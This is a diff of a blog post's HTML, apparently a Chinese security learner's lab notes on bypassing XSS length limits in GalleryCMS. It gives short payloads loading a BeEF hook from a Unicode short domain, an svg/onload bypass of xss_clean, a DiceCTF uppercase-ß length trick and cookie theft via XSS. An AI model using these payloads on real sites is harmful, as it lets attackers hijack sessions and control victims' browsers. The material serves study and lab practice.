+&lt;p&gt;注意：我买的域名被腾讯与搞了，无法解析，因此只能用一些奇技淫巧了&lt;/p&gt;
+&lt;p&gt;比如：我虚拟机的 kali 的 ip 是 192.168.13.133，我的 gallerycms 部署在本机上，我在本机上 host 文件加一个 dns 解析，将 radsm.co 解析到 192.168.13.133&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911201545877.png&#34; alt=&#34;image-20220911201545877&#34;&gt;&lt;/p&gt;
+&lt;p&gt;但要是这样我 tm 白搭了一天的 beef…&lt;/p&gt;
+&lt;p&gt;这样我们的 payload 就会变长，我使用的端口为 18888，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1yYWRzbS1ydDJoaTd6b21ydG9tYnBqY3EyaTNzemEuY286MTg4ODg=&#34;&gt;访问时就会变成 radsm.co:18888&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;我们做一下减法 payload 会多出 6 个字符，到时候能解析的时候我们的 payload 就可以少六个&lt;/p&gt;
+&lt;p&gt;1.payload 长度限制为 50 时&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;$.getScript(&amp;quot;//㎭℠.co&amp;quot;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload 中&amp;quot;&amp;quot; 和后半个闭合标签都不能缺少&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-![image-20220911231941383](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911231941383.png)
-
-2.payload长度限制为40时
-
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911231941383.png&#34; alt=&#34;image-20220911231941383&#34;&gt;&lt;/p&gt;
+&lt;p&gt;2.payload 长度限制为 40 时&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script src=//㎭℠.co&amp;gt;&amp;#x27;.length&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-![image-20220911232202908](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911232202908.png)
-
-
-
-###### 存在xss_clean并且长度限制为45个字符时
-
-利用XSS_clean 漏过滤的svg来绕过
-
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911232202908.png&#34; alt=&#34;image-20220911232202908&#34;&gt;&lt;/p&gt;
+&lt;h6 id=&#34;存在xss_clean并且长度限制为45个字符时&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#存在xss_clean并且长度限制为45个字符时&#34;&gt;#&lt;/a&gt; 存在 xss_clean 并且长度限制为 45 个字符时&lt;/h6&gt;
+&lt;p&gt;利用 XSS_clean 漏过滤的 svg 来绕过&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg/onload=$.getScript(&amp;quot;//㎭℠.co&amp;quot;)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-注意：如果此时在index.html内写入hook.js，并且使用宝塔面板，一定记着把bt自己的初始页的东西删光，不然无法上线
-
-并且bt使用自己的默认index.html的，在/www/server/panel下，具体可以去bt看，这个也一定要删掉或者完全改写，否则不会访问你站点首页的自己的index.html的
-
-
-
-还有一件很诡异的事，我gallerycms搭建在本机192.168.2.13上，beef-xss在kali 192.168.13.133上，在一样的payload前提下，在本机上始终无法上线，但在kali上就可以，本机上进行了域名和ip的尝试，始终不行，最后在kali访问本机的gallerycms成功上线
-
-
-
-补充:gallerycms的对新建album的过滤在application/controllers/album.php中，修改长度在这个文件里就能修改前端限制
-
-
-
-+1补充：本篇文件缺少一些xss的基础知识，如果看不懂先看[(49条消息) XSS详解及复现gallerycms字符长度限制短域名绕过_薄荷加冰心有多冷的博客-CSDN博客](https://blog.csdn.net/weixin_44811851/article/details/126080728)
-
-这个大佬写的文章
-
-
-
-
-
-
-
-### 3.通过特殊字符变为大写后长度变为原来两倍偷渡非法字符
-
-https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/
-
-假設我有個字串是 `ßßßßßßßß&lt;b&gt;1&lt;/b&gt;`，長度是 16，所以在初始化的時候 length 會是 16，但是當跑到迴圈的時候因為轉成大寫，會是 `8*2+8` = 24 個字，所以 24 個字會全部被寫進去 buf 裡面。
-
-在 `mock` 函式裡面，只會檢查 length 內的東西，所以最後 8 個字不會被檢查到，可以偷渡 `&lt;&gt;` 這些字元進去
-
-### 4.利用SVG/details绕过先抓取元素再赋值
-
-document.querySelector( &#39;.note&#39;).innerHTML = text;
-
-
-
-
-
-## 补充：httponly
-
-&gt; 　Cookie分为内存Cookie和硬盘Cookie，内存Cookie储存在浏览器内存中，关闭浏览器则消失。如果是想要利用保存在内存中的Cookie，需要获取到用户Cookie+用户浏览器未关闭。如果是硬盘Cookie，则该Cookie是一段时间有效的（有的时候我们登录网站会出现保持登录状态的选项，即保存在硬盘中），这类Cookie获取到后在其有效期内都是可以进行受害者用户身份登录的，进而实现入侵。
-&gt;
-&gt; 　　Cookie由变量名与值组成，其属性里有标准的cookie变量，也有用户自定义的属性。Cookie保存在浏览器的document对象中，对于存在XSS漏洞的网站，入侵者可以插入简单的XSS语句执行任意的JS脚本，以XSS攻击的手段获取网站其余用户的Cookie。
-&gt;
-&gt; 比如，举个简单例子：`&lt;script&gt;alert(document.cookie)&lt;/script&gt;`
+&lt;p&gt;注意：如果此时在 index.html 内写入 hook.js，并且使用宝塔面板，一定记着把 bt 自己的初始页的东西删光，不然无法上线&lt;/p&gt;
+&lt;p&gt;并且 bt 使用自己的默认 index.html 的，在 /www/server/panel 下，具体可以去 bt 看，这个也一定要删掉或者完全改写，否则不会访问你站点首页的自己的 index.html 的&lt;/p&gt;
+&lt;p&gt;还有一件很诡异的事，我 gallerycms 搭建在本机 192.168.2.13 上，beef-xss 在 kali 192.168.13.133 上，在一样的 payload 前提下，在本机上始终无法上线，但在 kali 上就可以，本机上进行了域名和 ip 的尝试，始终不行，最后在 kali 访问本机的 gallerycms 成功上线&lt;/p&gt;
+&lt;p&gt;补充:gallerycms 的对新建 album 的过滤在 application/controllers/album.php 中，修改长度在这个文件里就能修改前端限制&lt;/p&gt;
+&lt;p&gt;+1 补充：本篇文件缺少一些 xss 的基础知识，如果看不懂先看&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgxMTg1MS9hcnRpY2xlL2RldGFpbHMvMTI2MDgwNzI4&#34;&gt; (49 条消息) XSS 详解及复现 gallerycms 字符长度限制短域名绕过_薄荷加冰心有多冷的博客 - CSDN 博客&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;这个大佬写的文章&lt;/p&gt;
+&lt;h3 id=&#34;3通过特殊字符变为大写后长度变为原来两倍偷渡非法字符&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3通过特殊字符变为大写后长度变为原来两倍偷渡非法字符&#34;&gt;#&lt;/a&gt; 3. 通过特殊字符变为大写后长度变为原来两倍偷渡非法字符&lt;/h3&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmh1bGkudHcvMjAyMi8wMi8wOC93aGF0LWktbGVhcm5lZC1mcm9tLWRpY2VjdGYtMjAyMi8=&#34;&gt;https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;假設我有個字串是  &lt;code&gt;ßßßßßßßß&amp;lt;b&amp;gt;1&amp;lt;/b&amp;gt;&lt;/code&gt; ，長度是 16，所以在初始化的時候 length 會是 16，但是當跑到迴圈的時候因為轉成大寫，會是  &lt;code&gt;8*2+8&lt;/code&gt;  = 24 個字，所以 24 個字會全部被寫進去 buf 裡面。&lt;/p&gt;
+&lt;p&gt;在  &lt;code&gt;mock&lt;/code&gt;  函式裡面，只會檢查 length 內的東西，所以最後 8 個字不會被檢查到，可以偷渡  &lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt;  這些字元進去&lt;/p&gt;
+&lt;h3 id=&#34;4利用svgdetails绕过先抓取元素再赋值&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4利用svgdetails绕过先抓取元素再赋值&#34;&gt;#&lt;/a&gt; 4. 利用 SVG/details 绕过先抓取元素再赋值&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;document.querySelector( &#39;.note&#39;).innerHTML = text;&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;补充httponly&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#补充httponly&#34;&gt;#&lt;/a&gt; 补充：httponly&lt;/h2&gt;
 &lt;blockquote&gt;
+&lt;p&gt;Cookie 分为内存 Cookie 和硬盘 Cookie，内存 Cookie 储存在浏览器内存中，关闭浏览器则消失。如果是想要利用保存在内存中的 Cookie，需要获取到用户 Cookie + 用户浏览器未关闭。如果是硬盘 Cookie，则该 Cookie 是一段时间有效的（有的时候我们登录网站会出现保持登录状态的选项，即保存在硬盘中），这类 Cookie 获取到后在其有效期内都是可以进行受害者用户身份登录的，进而实现入侵。&lt;/p&gt;
+&lt;p&gt;Cookie 由变量名与值组成，其属性里有标准的 cookie 变量，也有用户自定义的属性。Cookie 保存在浏览器的 document 对象中，对于存在 XSS 漏洞的网站，入侵者可以插入简单的 XSS 语句执行任意的 JS 脚本，以 XSS 攻击的手段获取网站其余用户的 Cookie。&lt;/p&gt;
+&lt;p&gt;比如，举个简单例子： &lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Cookie 是通过 http response header 种到浏览器的，设置 Cookie 的语法为：&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029192451385.png&#34; alt=&#34;image-20221029192451385&#34;&gt;&lt;/p&gt;
